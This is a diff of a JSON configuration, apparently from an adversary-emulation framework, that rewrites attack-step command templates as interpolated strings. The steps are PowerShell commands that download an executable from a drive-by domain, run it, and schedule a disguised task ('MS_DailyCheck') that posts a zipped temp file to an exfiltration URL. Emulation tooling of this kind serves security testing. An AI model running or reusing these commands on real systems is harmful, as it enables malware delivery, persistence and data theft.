@@ -138,19 +138,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell mkdir ",
-                            "self.temp_dir",
-                            "; Invoke-WebRequest -Uri \"",
-                            "self.driveby_domain",
-                            "/help_win_x86.exe\" -OutFile ",
-                            "self.temp_dir",
-                            "\\",
-                            "self.tool_name",
-                            ".exe"
-                        ]
-                    }
+                    "command": "powershell mkdir ${self.temp_dir}; Invoke-WebRequest -Uri \"${self.driveby_domain}/help_win_x86.exe\" -OutFile ${self.temp_dir}\\${self.tool_name}.exe"
                 }
             }
         },
@@ -163,14 +151,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "self.temp_dir",
-                            "\\",
-                            "self.tool_name",
-                            ".exe"
-                        ]
-                    }
+                    "command": "self.temp_dir${\\}self.tool_name${.exe}"
                 }
             }
         },
@@ -183,13 +164,7 @@
                 "tool": "self.tool",
                 "target": "self.target_1",
                 "tune": {
-                    "command": {
-                        "template": [
-                            "powershell &{$time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); $command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; SchTasks.exe /Create /SC ONCE /TN \"MS_DailyCheck\", /TR \"powershell Invoke-RestMethod -Uri ",
-                            "self.exfil_url",
-                            " -Method Post -InFile  C:\\Users\\$username\\AppData\\Local\\Temp\\new.zip\" /ST $hourMinute /F}"
-                        ]
-                    }
+                    "command": "powershell &{$time = [DateTime]::Now.AddMinutes(30); $hourMinute=$time.ToString(\"HH:mm\"); $command = quser; $string = Out-String -inputobject $command; $username = $string.split(\"`n>\")[2].split()[0]; SchTasks.exe /Create /SC ONCE /TN \"MS_DailyCheck\", /TR \"powershell Invoke-RestMethod -Uri ${self.exfil_url} -Method Post -InFile  C:\\Users\\$username\\AppData\\Local\\Temp\\new.zip\" /ST $hourMinute /F}"
                 }
             }
         },
